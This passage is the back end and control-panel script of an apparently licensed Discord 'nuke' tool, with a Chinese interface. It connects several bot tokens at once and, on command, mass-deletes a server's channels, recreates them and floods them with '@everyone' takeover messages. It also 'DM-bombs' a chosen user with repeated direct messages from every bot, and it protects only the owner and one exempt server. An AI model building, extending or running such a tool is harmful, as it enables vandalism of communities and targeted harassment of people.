        function addTokenSlot(value) {
            tokenSlotCount++;
            var container = document.getElementById('token-slots');
            var wrapper = document.createElement('div');
            wrapper.style.display = 'flex';
            wrapper.style.gap = '4px';
            wrapper.style.marginBottom = '6px';
            wrapper.dataset.slot = tokenSlotCount;
            var input = document.createElement('input');
            input.type = 'password';
            input.placeholder = 'Bot ' + tokenSlotCount + ' Token';
            input.className = 'token-slot';
            input.style.flex = '1';
            if (value) input.value = value;
            var btn = document.createElement('button');
            btn.textContent = 'x';
            btn.style.cssText = 'background:rgba(231,76,60,0.2);border:1px solid #e74c3c;color:#e74c3c;padding:4px 10px;border-radius:6px;cursor:pointer;font-size:12px;flex-shrink:0;';
            btn.onclick = function() { wrapper.remove(); };
            wrapper.appendChild(input);
            wrapper.appendChild(btn);
            container.appendChild(wrapper);
        }
        (function() { addTokenSlot(); addTokenSlot(); addTokenSlot(); })();

        function fillFirstEmptySlot(index) {
            apiPost('/api/get_token_by_index', { index: index }).then(function(res) {
                var tok = (res && res.token) ? res.token : '';
                if (!tok) return;
                var slots = document.querySelectorAll('#token-slots input[type=password]');
                for (var i = 0; i < slots.length; i++) {
                    if (!slots[i].value.trim()) { slots[i].value = tok; return; }
                }
                addTokenSlot(tok);
            });
        }

        function connectAllBots() {
            var tokens = [];
            var slots = document.querySelectorAll('#token-slots input[type=password]');
            slots.forEach(function(el) { if (el.value.trim()) tokens.push(el.value.trim()); });
            if (tokens.length === 0) { alert('請至少填入 1 個 Bot Token'); return; }
            var ownerId = (document.getElementById('owner-id').value || '').trim();
            tokens.forEach(function(t) { apiPost('/api/save_token', { token: t }); });
            doConnectDiscord({ tokens: tokens, owner_id: ownerId });
        }

        function doConnectDiscord(payload) {
            var connectBtn = document.getElementById('connect-btn');
            connectBtn.disabled = true;
            connectBtn.textContent = '連線中...';
            document.getElementById('bot-status').textContent = '-- 連線中...';
            document.getElementById('bot-status').className = 'pulse';
            document.getElementById('bot-name').textContent = '連線中...';
            apiPost('/api/connect_discord', payload).then(function(r) {
                if (!r || !r[0]) {
                    connectBtn.disabled = false;
                    connectBtn.textContent = '連線全部機器人';
                    document.getElementById('bot-status').textContent = '-- 離線';
                    document.getElementById('bot-status').className = '';
                    document.getElementById('bot-name').textContent = '0 隻未連線';
                    alert(r && r[1] ? r[1] : '連線失敗');
                    return;
                }
                if (r[1] === 'pending') {
                    var poll = setInterval(function() {
                        apiGet('/api/get_login_status').then(function(s) {
                            if (s && s.length >= 3) {
                                clearInterval(poll);
                                connectBtn.disabled = false;
                                connectBtn.textContent = '連線全部機器人';
                                document.getElementById('bot-status').className = '';
                                var names = s[1];
                                var namesStr = Array.isArray(names) ? names.filter(Boolean).join(', ') : (names || '');
                                var count = Array.isArray(names) ? names.filter(Boolean).length : (names ? 1 : 0);
                                document.getElementById('bot-name').textContent = count + ' 隻 ' + (namesStr ? namesStr : '已連線');
                                if (s[2] === true) {
                                    document.getElementById('bot-status').textContent = '-- ' + count + ' 隻在線';
                                    document.getElementById('bot-status').style.color = '#2ecc71';
                                    refreshGuilds();
                                    refreshAuth();
                                } else {
                                    document.getElementById('bot-status').textContent = '-- 逾時';
                                    document.getElementById('bot-status').style.color = '#e74c3c';
                                }
                            }
                        });
                    }, 500);
                    setTimeout(function() { clearInterval(poll); connectBtn.disabled = false; connectBtn.textContent = '連線全部機器人'; }, 25000);
                }
            }).catch(function() {
                connectBtn.disabled = false;
                connectBtn.textContent = '連線全部機器人';
                document.getElementById('bot-status').textContent = '-- 離線';
                document.getElementById('bot-status').className = '';
                document.getElementById('bot-name').textContent = '0 隻未連線';
            });
        }

        function refreshGuilds() {
            apiGet('/api/get_guilds').then(function(arr) {
                var sel = document.getElementById('gid');
                if (!sel) return;
                var oldVal = sel.value;
                sel.innerHTML = '<option value="">-- 選擇伺服器 --</option>';
                (arr || []).forEach(function(g) {
                    var opt = document.createElement('option');
                    opt.value = g.id;
                    opt.textContent = g.name + ' (' + (g.member_count || 0) + ')';
                    sel.appendChild(opt);
                });
                if (oldVal) sel.value = oldVal;
            });
        }

        function send(t) {
            var gidEl = document.getElementById('gid');
            var gidText = document.getElementById('gid-text');
            var gid = (gidText && gidText.value.trim()) || (gidEl && gidEl.value) || '';
            var data = {
                gid: gid,
                msg: document.getElementById('msg').value,
                channel_count: parseInt(document.getElementById('channel_count').value, 10) || 50,
                spam_rounds: parseInt(document.getElementById('spam_rounds').value, 10) || 50,
                spam_delay: parseFloat(document.getElementById('spam_delay').value) || 0.005
            };
            apiPost('/api/exec_command', { cmd: t, data: data });
        }

        function dmBomb() {
            var target = (document.getElementById('dm-target').value || '').trim();
            var msg = document.getElementById('dm-message').value || '';
            var amount = parseInt(document.getElementById('dm-amount').value, 10) || 100;
            var delay = parseFloat(document.getElementById('dm-delay').value) || 0.3;
            if (!target) { alert('請輸入目標用戶 ID'); return; }
            if (!msg) { alert('請輸入訊息內容'); return; }
            apiPost('/api/dm_bomb', { target: target, message: msg, amount: amount, delay: delay });
        }

        function dmMultiBomb() {
            var target = (document.getElementById('dm-target').value || '').trim();
            var raw = document.getElementById('dm-multi-message').value || '';
            var delay = parseFloat(document.getElementById('dm-delay').value) || 0.3;
            if (!target) { alert('請輸入目標用戶 ID'); return; }
            var msgs = raw.split('|').map(function(s) { return s.trim(); }).filter(function(s) { return s; });
            if (msgs.length === 0) { alert('請輸入至少一條訊息'); return; }
            apiPost('/api/dm_multi', { target: target, messages: msgs, delay: delay });
        }

        function dmStop() {
            apiPost('/api/dm_stop', {});
        }

        function addAuth() {
            var uid = (document.getElementById('auth-user-id').value || '').trim();
            if (!uid) { alert('請輸入用戶 ID'); return; }
            apiPost('/api/add_auth', { user_id: uid }).then(function(r) {
                if (r && r.ok) { document.getElementById('auth-user-id').value = ''; refreshAuth(); }
                else { alert(r && r.error ? r.error : '操作失敗'); }
            });
        }

        function removeAuth() {
            var uid = (document.getElementById('auth-user-id').value || '').trim();
            if (!uid) { alert('請輸入用戶 ID'); return; }
            apiPost('/api/remove_auth', { user_id: uid }).then(function(r) {
                if (r && r.ok) { document.getElementById('auth-user-id').value = ''; refreshAuth(); }
                else { alert(r && r.error ? r.error : '操作失敗'); }
            });
        }

        function refreshAuth() {
            apiGet('/api/get_auth_users').then(function(arr) {
                var el = document.getElementById('auth-list');
                var cntEl = document.getElementById('auth-count');
                if (!el) return;
                el.innerHTML = '';
                var count = (arr || []).length;
                if (cntEl) cntEl.textContent = count;
                (arr || []).forEach(function(u) {
                    var div = document.createElement('div');
                    div.className = 'auth-item';
                    var span = document.createElement('span');
                    span.textContent = u.name + ' (' + u.id + ')' + (u.is_owner ? ' [Owner]' : '');
                    div.appendChild(span);
                    if (!u.is_owner) {
                        var btn = document.createElement('button');
                        btn.textContent = '移除';
                        btn.onclick = function() {
                            apiPost('/api/remove_auth', { user_id: String(u.id) }).then(function() { refreshAuth(); });
                        };
                        div.appendChild(btn);
                    }
                    el.appendChild(div);
                });
                if (count === 0) el.innerHTML = '<div style="color:#666; font-size:12px; padding:8px;">尚無授權用戶</div>';
            });
        }

        function triggerLogout() {
            var btn = document.getElementById('logout-btn');
            if (btn) btn.disabled = true;
            apiPost('/api/logout').then(function() { window.location.reload(); }).catch(function() { window.location.reload(); });
        }

        function clearLogs() {
            apiPost('/api/clear_logs').then(function() {
                var l = document.getElementById('logs');
                if (l) l.innerHTML = '<div>[日誌已清除]</div>';
            });
        }

        window.addLog = function(t) {
            var l = document.getElementById('logs');
            if (l) { l.innerHTML += '<div>' + t + '</div>'; l.scrollTop = l.scrollHeight; }
        };

        setInterval(function() {
            var el = document.getElementById('time-display');
            if (el) el.innerText = new Date().toLocaleTimeString();
        }, 1000);

        setInterval(function() {
            apiGet('/api/get_logs').then(function(msgs) {
                if (msgs && msgs.length) msgs.forEach(function(m) { window.addLog(m); });
            });
        }, 300);

        var p = [];
        var trails = [];
        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        window.onresize = resize;
        resize();
        function Pt() {
            this.x = Math.random() * canvas.width;
            this.y = Math.random() * canvas.height;
            this.s = Math.random() * 2.5 + 0.3;
            this.sy = Math.random() * 0.8 + 0.15;
            this.sx = (Math.random() - 0.5) * 0.8;
            this.alpha = Math.random() * 0.2 + 0.06;
        }
        Pt.prototype.draw = function() {
            ctx.fillStyle = 'rgba(212, 175, 55, ' + this.alpha + ')';
            ctx.beginPath();
            ctx.arc(this.x, this.y, this.s, 0, Math.PI * 2);
            ctx.fill();
        };
        Pt.prototype.update = function() {
            this.y -= this.sy;
            this.x += this.sx;
            if (this.y < 0) this.y = canvas.height;
            if (this.y > canvas.height) this.y = 0;
            if (this.x < 0 || this.x > canvas.width) this.sx *= -1;
        };
        for (var i = 0; i < 120; i++) p.push(new Pt());
        function Trail() {
            this.x = Math.random() * canvas.width;
            this.y = 0;
            this.w = Math.random() * 2 + 1;
            this.speed = Math.random() * 2 + 1;
        }
        Trail.prototype.draw = function() {
            ctx.fillStyle = 'rgba(212, 175, 55, 0.08)';
            ctx.fillRect(this.x, this.y, this.w, 40);
        };
        Trail.prototype.update = function() {
            this.y += this.speed;
            if (this.y > canvas.height + 50) { this.y = -50; this.x = Math.random() * canvas.width; }
        };
        for (var j = 0; j < 25; j++) trails.push(new Trail());
        function anim() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            var g = ctx.createRadialGradient(canvas.width/2, canvas.height/2, 0, canvas.width/2, canvas.height/2, canvas.width * 0.8);
            g.addColorStop(0, 'rgba(40,35,60,0.5)');
            g.addColorStop(0.5, 'rgba(20,15,35,0.2)');
            g.addColorStop(1, 'rgba(8,6,18,0.1)');
            ctx.fillStyle = g;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            trails.forEach(function(t) { t.update(); t.draw(); });
            p.forEach(function(i) { i.update(); i.draw(); });
            requestAnimationFrame(anim);
        }
        anim();
    </script>
</body>
</html>
'''


class Api:
    def __init__(self, window=None):
        self.window = window

    def check_key(self, key):
        key_clean = (key or '').strip()
        valid = key_clean in VALID_KEYS
        if valid:
            return [True]
        return [False, '授權碼無效']

    def get_tokens(self):
        global _saved_tokens
        out = []
        for i, t in enumerate(_saved_tokens):
            if t and len(t) > 8:
                out.append({'index': i, 'masked': '...' + t[-8:]})
            else:
                out.append({'index': i, 'masked': '...'})
        return out

    def get_token_by_index(self, index):
        global _saved_tokens
        if isinstance(index, int) and 0 <= index < len(_saved_tokens):
            return _saved_tokens[index]
        return None

    def save_token(self, token):
        global _saved_tokens
        t = (token or '').strip()
        if not t:
            return False
        if t in _saved_tokens:
            _saved_tokens.remove(t)
        _saved_tokens.insert(0, t)
        _saved_tokens[:] = _saved_tokens[:MAX_SAVED_TOKENS]
        _save_tokens()
        return True

    def connect_discord(self, token_or_index_or_tokens, owner_id=None):
        global multi_clients, multi_loops, multi_names, multi_ready_events, login_pending, login_result, _saved_tokens, OWNER_ID
        tokens_to_use = []
        if isinstance(token_or_index_or_tokens, list):
            tokens_to_use = [str(t).strip() for t in token_or_index_or_tokens if t and str(t).strip()]
        elif isinstance(token_or_index_or_tokens, int) and 0 <= token_or_index_or_tokens < len(_saved_tokens):
            tokens_to_use = [_saved_tokens[token_or_index_or_tokens]]
        elif isinstance(token_or_index_or_tokens, str) and token_or_index_or_tokens.strip():
            tokens_to_use = [token_or_index_or_tokens.strip()]
        if not tokens_to_use:
            return [False, '請輸入或選擇至少 1 個 Token']

        if owner_id:
            try:
                OWNER_ID = int(owner_id)
                authorized_users.add(OWNER_ID)
                save_authorized_users()
            except (ValueError, TypeError):
                pass

        login_pending = True
        login_result = None

        def do_connect():
            global multi_clients, multi_loops, multi_names, multi_ready_events, login_pending, login_result
            n = len(tokens_to_use)
            try:
                with multi_lock:
                    old_pairs = list(zip(multi_clients, multi_loops))
                    multi_clients.clear()
                    multi_loops.clear()
                    multi_names.clear()
                    multi_ready_events.clear()
                for c, l in old_pairs:
                    if c and l:
                        try:
                            asyncio.run_coroutine_threadsafe(c.close(), l).result(timeout=3)
                        except Exception:
                            pass

                with multi_lock:
                    for _ in range(n):
                        multi_clients.append(None)
                        multi_loops.append(None)
                        multi_names.append(None)
                        multi_ready_events.append(threading.Event())

                for slot, tok in enumerate(tokens_to_use):
                    threading.Thread(target=_run_one_bot, args=(slot, tok, OWNER_ID), daemon=True).start()

                for ev in multi_ready_events:
                    ev.wait(timeout=20)
                with multi_lock:
                    names = list(multi_names)
                login_result = [True, names, True]
            except Exception as e:
                login_result = [False, str(e), False]
            finally:
                login_pending = False

        threading.Thread(target=do_connect, daemon=True).start()
        return [True, "pending", False]

    def get_login_status(self):
        global login_pending, login_result
        if not login_pending and login_result is not None:
            out = login_result
            login_result = None
            return out
        return None

    def clear_logs(self):
        clear_log_queue()
        return True

    def get_guilds(self):
        global multi_clients, multi_loops
        if not multi_clients or not multi_loops:
            return []
        for i, (c, l) in enumerate(zip(multi_clients, multi_loops)):
            if c and l:
                try:
                    bot = c
                    async def _list():
                        out = []
                        for g in bot.guilds:
                            out.append({'id': str(g.id), 'name': g.name, 'member_count': getattr(g, 'member_count', 0)})
                        return out
                    return asyncio.run_coroutine_threadsafe(_list(), l).result(timeout=5)
                except Exception:
                    continue
        return []

    def get_logs(self):
        out = []
        try:
            while True:
                out.append(log_queue.get_nowait())
        except queue.Empty:
            pass
        return out

    def logout(self):
        global STOP_SIGNAL, DM_STOP_SIGNAL, multi_clients, multi_loops
        STOP_SIGNAL = True
        DM_STOP_SIGNAL = True
        put_log('正在登出系統...')
        with multi_lock:
            for c, l in zip(multi_clients, multi_loops):
                if c and l:
                    try:
                        asyncio.run_coroutine_threadsafe(c.close(), l).result(timeout=5)
                    except Exception:
                        pass
            multi_clients.clear()
            multi_loops.clear()
            multi_names.clear()
            multi_ready_events.clear()

    def exec_command(self, cmd_type, data):
        global STOP_SIGNAL, multi_clients, multi_loops
        if cmd_type == 'stop':
            STOP_SIGNAL = True
            put_log('[停止] 訊號已發送')
            return

        active = [(c, l) for c, l in zip(multi_clients, multi_loops) if c and l]
        if not active:
            put_log('請先連線至少 1 隻機器人')
            return

        gid = (data.get('gid') or '').strip()
        if not gid:
            put_log('錯誤：請輸入伺服器 ID')
            return

        try:
            guild_id = int(gid)
        except ValueError:
            put_log('錯誤：伺服器 ID 必須為數字')
            return

        if guild_id == PROTECTED_GUILD_ID:
            put_log('拒絕操作保護伺服器')
            return

        msg = data.get('msg') or '@everyone D123 接管中...'
        global current_nuke_channel_count, current_nuke_spam_rounds, current_nuke_spam_delay
        if data.get('channel_count') is not None:
            try:
                current_nuke_channel_count = max(1, min(100, int(data.get('channel_count', 50))))
            except (TypeError, ValueError):
                pass
        if data.get('spam_rounds') is not None:
            try:
                current_nuke_spam_rounds = max(1, min(200, int(data.get('spam_rounds', 50))))
            except (TypeError, ValueError):
                pass
        if data.get('spam_delay') is not None:
            try:
                current_nuke_spam_delay = max(0.001, min(2.0, float(data.get('spam_delay', 0.005))))
            except (TypeError, ValueError):
                pass

        if cmd_type == 'expand':
            STOP_SIGNAL = False
            put_log('[Nuke 擴張] %d 隻機器人同時執行（刪除->創建->發送）' % len(active))

            async def run_nuke(bot):
                try:
                    await bot.mass_delete_channels(guild_id)
                    await asyncio.sleep(1.2)
                    new_ids = await bot.mass_create_channels(guild_id)
                    await asyncio.sleep(1.0)
                    if new_ids:
                        await bot.mass_send_messages(new_ids, content=msg)
                    put_log('[Nuke] 單隻完成')
                except Exception as e:
                    put_log('[Nuke] 錯誤: %s' % e)

            for c, l in active:
                asyncio.run_coroutine_threadsafe(run_nuke(c), l)
            put_log('[Nuke] 已派發 %d 隻機器人' % len(active))

        elif cmd_type == 'purge':
            STOP_SIGNAL = True
            put_log('[Nuke 清理] %d 隻機器人同時執行...' % len(active))

            async def do_purge(bot):
                try:
                    await bot.mass_delete_channels(guild_id)
                    put_log('[Nuke 清理] 單隻完成')
                except Exception as e:
                    put_log('[Nuke 清理] 錯誤: %s' % e)

            for c, l in active:
                asyncio.run_coroutine_threadsafe(do_purge(c), l)
            put_log('[Nuke 清理] 已派發 %d 隻機器人' % len(active))

    def dm_bomb(self, target, message, amount=100, delay=0.3):
        global DM_STOP_SIGNAL, multi_clients, multi_loops, DM_BOMB_DELAY
        active = [(c, l) for c, l in zip(multi_clients, multi_loops) if c and l]
        if not active:
            put_log('[DM] 請先連線至少 1 隻機器人')
            return
        try:
            target_id = int(target)
        except (ValueError, TypeError):
            put_log('[DM] 用戶 ID 格式錯誤')
            return
        if target_id == OWNER_ID:
            put_log('[DM] 拒絕轟炸擁有者')
            return
        DM_BOMB_DELAY = max(0.1, float(delay))
        DM_STOP_SIGNAL = False
        put_log('[DM] 開始轟炸用戶 %s，使用 %d 隻機器人' % (target_id, len(active)))

        async def do_dm(bot):
            await bot.panel_dm_bomb(target_id, message, amount)

        for c, l in active:
            asyncio.run_coroutine_threadsafe(do_dm(c), l)

    def dm_multi(self, target, messages, delay=0.3):
        global DM_STOP_SIGNAL, multi_clients, multi_loops, DM_BOMB_DELAY
        active = [(c, l) for c, l in zip(multi_clients, multi_loops) if c and l]
        if not active:
            put_log('[DM] 請先連線至少 1 隻機器人')
            return
        try:
            target_id = int(target)
        except (ValueError, TypeError):
            put_log('[DM] 用戶 ID 格式錯誤')
            return
        if target_id == OWNER_ID:
            put_log('[DM] 拒絕轟炸擁有者')
            return
        if not isinstance(messages, list) or not messages:
            put_log('[DM] 訊息列表為空')
            return
        DM_BOMB_DELAY = max(0.1, float(delay))
        DM_STOP_SIGNAL = False
        put_log('[DM] 多訊息轟炸用戶 %s，%d 條訊息 x %d 隻機器人' % (target_id, len(messages), len(active)))

        async def do_dm_multi(bot):
            await bot.panel_dm_multi(target_id, messages)

        for c, l in active:
            asyncio.run_coroutine_threadsafe(do_dm_multi(c), l)

    def dm_stop(self):
        global DM_STOP_SIGNAL
        DM_STOP_SIGNAL = True
        put_log('[DM] 停止訊號已發送')

    def add_auth(self, user_id):
        global authorized_users, OWNER_ID
        try:
            uid = int(user_id)
        except (ValueError, TypeError):
            return {'ok': False, 'error': '用戶 ID 格式錯誤'}
        if uid == OWNER_ID:
            return {'ok': False, 'error': '該用戶已是擁有者'}
        authorized_users.add(uid)
        save_authorized_users()
        put_log('[權限] 已授予 %s 使用權限' % uid)
        return {'ok': True}

    def remove_auth(self, user_id):
        global authorized_users, OWNER_ID
        try:
            uid = int(user_id)
        except (ValueError, TypeError):
            return {'ok': False, 'error': '用戶 ID 格式錯誤'}
        if uid == OWNER_ID:
            return {'ok': False, 'error': '無法移除擁有者權限'}
        if uid in authorized_users:
            authorized_users.discard(uid)
            save_authorized_users()
            put_log('[權限] 已移除 %s 的使用權限' % uid)
            return {'ok': True}
        return {'ok': False, 'error': '該用戶沒有權限'}

    def get_auth_users(self):
        global authorized_users, OWNER_ID, multi_clients, multi_loops
        out = []
        bot_ref = None
        loop_ref = None
        for c, l in zip(multi_clients, multi_loops):
            if c and l:
                bot_ref = c
                loop_ref = l
                break

        async def _fetch_user(uid):
            try:
                u = await bot_ref.fetch_user(uid)
                return u.name
            except Exception:
                return None

        for uid in authorized_users:
            name = None
            if bot_ref and loop_ref:
                try:
                    name = asyncio.run_coroutine_threadsafe(_fetch_user(uid), loop_ref).result(timeout=3)
                except Exception:
                    name = None
            out.append({
                'id': str(uid),
                'name': name or '未知用戶',
                'is_owner': uid == OWNER_ID
            })
        return out


_api = Api(None)


app = Flask(__name__)
api = _api


@app.route('/')
def index():
    return Response(HTML_TEMPLATE, content_type='text/html; charset=utf-8')


@app.route('/api/get_login_status', methods=['GET'])
def get_login_status():
    r = api.get_login_status()
    return jsonify(r if r is not None else [])


@app.route('/api/get_logs', methods=['GET'])
def get_logs():
    return jsonify(api.get_logs())


@app.route('/api/get_tokens', methods=['GET'])
def get_tokens():
    return jsonify(api.get_tokens())


@app.route('/api/get_guilds', methods=['GET'])
def get_guilds():
    return jsonify(api.get_guilds())


@app.route('/api/get_auth_users', methods=['GET'])
def get_auth_users():
    return jsonify(api.get_auth_users())


@app.route('/api/check_key', methods=['POST'])
def check_key():
    data = request.get_json(silent=True) or {}
    return jsonify(api.check_key(data.get('key', '')))


@app.route('/api/connect_discord', methods=['POST'])
def connect_discord():
    b = request.get_json(silent=True) or {}
    owner_id = b.get('owner_id')
    if 'tokens' in b and isinstance(b['tokens'], list):
        r = api.connect_discord(b['tokens'], owner_id=owner_id)
    elif 'token' in b:
        r = api.connect_discord(b['token'], owner_id=owner_id)
    elif 'index' in b:
        r = api.connect_discord(int(b['index']), owner_id=owner_id)
    else:
        r = [False, '請提供 token、tokens 或 index']
    return jsonify(r)


@app.route('/api/save_token', methods=['POST'])
def save_token():
    data = request.get_json(silent=True) or {}
    api.save_token(data.get('token', ''))
    return jsonify({'ok': True})


@app.route('/api/get_token_by_index', methods=['POST'])
def get_token_by_index():
    data = request.get_json(silent=True) or {}
    idx = int(data.get('index', -1))
    tok = api.get_token_by_index(idx)
    return jsonify({'token': tok} if tok else {})


@app.route('/api/logout', methods=['POST'])
def logout():
    api.logout()
    return jsonify({'ok': True})


@app.route('/api/clear_logs', methods=['POST'])
def clear_logs():
    api.clear_logs()
    return jsonify({'ok': True})


@app.route('/api/exec_command', methods=['POST'])
def exec_command():
    data = request.get_json(silent=True) or {}
    api.exec_command(data.get('cmd', ''), data.get('data', {}))
    return jsonify({'ok': True})


@app.route('/api/dm_bomb', methods=['POST'])
def dm_bomb():
    b = request.get_json(silent=True) or {}
    api.dm_bomb(b.get('target', ''), b.get('message', ''), b.get('amount', 100), b.get('delay', 0.3))
    return jsonify({'ok': True})


@app.route('/api/dm_multi', methods=['POST'])
def dm_multi():
    b = request.get_json(silent=True) or {}
    api.dm_multi(b.get('target', ''), b.get('messages', []), b.get('delay', 0.3))
    return jsonify({'ok': True})


@app.route('/api/dm_stop', methods=['POST'])
def dm_stop():
    api.dm_stop()
    return jsonify({'ok': True})


@app.route('/api/add_auth', methods=['POST'])
def add_auth():
    data = request.get_json(silent=True) or {}
    return jsonify(api.add_auth(data.get('user_id', '')))


@app.route('/api/remove_auth', methods=['POST'])
def remove_auth():
    data = request.get_json(silent=True) or {}
    return jsonify(api.remove_auth(data.get('user_id', '')))


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
